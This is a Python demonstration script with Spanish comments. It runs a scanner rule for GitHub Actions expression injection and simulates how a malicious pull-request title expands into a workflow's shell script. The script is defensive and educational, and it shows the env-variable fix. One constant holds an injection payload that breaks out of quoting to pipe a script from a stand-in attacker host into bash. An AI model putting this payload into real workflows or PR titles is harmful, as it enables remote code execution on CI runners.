#!/usr/bin/env python3
"""
Ejecuta la regla REAL de Zenith Engine R1016 (engine/rules/triggers.py)
sobre vulnerable.yml y fixed.yml, y ademas reproduce la EXPANSION DE TEXTO
literal que hace GitHub Actions antes de invocar bash: sustituye ${{ ... }}
por un valor atacante-controlado y muestra el script resultante que
realmente se ejecutaria, tal cual lo veria /bin/bash.
"""
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent.parent.parent
sys.path.insert(0, str(REPO_ROOT))

from engine.parser import parse_workflow
from engine.rules.triggers import check_expression_injection_1016

# Payload de ejemplo: un título de PR malicioso realista.
MALICIOUS_PR_TITLE = '"; curl -s https://attacker.example/steal.sh | bash #'


def print_alert(alert):
    print(f"  [{alert['severity']:8s}] {alert['rule_id']}  línea {alert['line']}: {alert['description']}")


def analyze(path):
    print(f'\n=== {path.name} ===')
    workflow, lines = parse_workflow(str(path))
    alerts = check_expression_injection_1016(workflow, lines, lang='es')
    if not alerts:
        print('  Sin hallazgos IW: ninguna expresión no confiable se interpola directamente en run:.')
        return
    for alert in sorted(alerts, key=lambda a: a['line']):
        print_alert(alert)


def simulate_expansion(path, expression_key, malicious_value):
    print(f'\n--- Expansión literal de GitHub Actions para {path.name} ---')
    workflow, _ = parse_workflow(str(path))

    for job in workflow.get('jobs', {}).values():
        for step in job.get('steps', []):
            run = step.get('run', '') or ''
            placeholder = '${{ ' + expression_key + ' }}'
            if placeholder in run:
                expanded = run.replace(placeholder, malicious_value)
                print('  Script ANTES de la expansión (lo que hay en el .yml):')
                for line in run.rstrip().splitlines():
                    print(f'    {line}')
                print('  Script DESPUÉS de la expansión (lo que ejecuta bash de verdad):')
                for line in expanded.rstrip().splitlines():
                    print(f'    {line}')
                print('  -> "curl ... | bash" pasa a formar parte del script real: RCE.')
                return

    for job in workflow.get('jobs', {}).values():
        for step in job.get('steps', []):
            env = step.get('env', {}) or {}
            for var_name, value in env.items():
                if value == '${{ ' + expression_key + ' }}':
                    run = step.get('run', '') or ''
                    print(f'  La expresión llega como variable de entorno {var_name}, no se interpola en el texto del script.')
                    print('  Script (no cambia con el valor de la variable):')
                    for line in run.rstrip().splitlines():
                        print(f'    {line}')
                    print(f'  En tiempo de ejecución, la shell recibe {var_name}="{malicious_value}" como VALOR de una')
                    print('  variable, nunca como texto de script: se imprime tal cual, sin ejecutar nada de su contenido.')
                    return


def main():
    base = Path(__file__).parent
    analyze(base / 'vulnerable.yml')
    analyze(base / 'fixed.yml')

    print('\n=== Simulación de la inyección (payload de ejemplo) ===')
    print(f'  Título de PR malicioso usado en la simulación:\n    {MALICIOUS_PR_TITLE!r}')
    simulate_expansion(base / 'vulnerable.yml', 'github.event.pull_request.title', MALICIOUS_PR_TITLE)
    simulate_expansion(base / 'fixed.yml', 'github.event.pull_request.title', MALICIOUS_PR_TITLE)


if __name__ == '__main__':
    sys.exit(main())
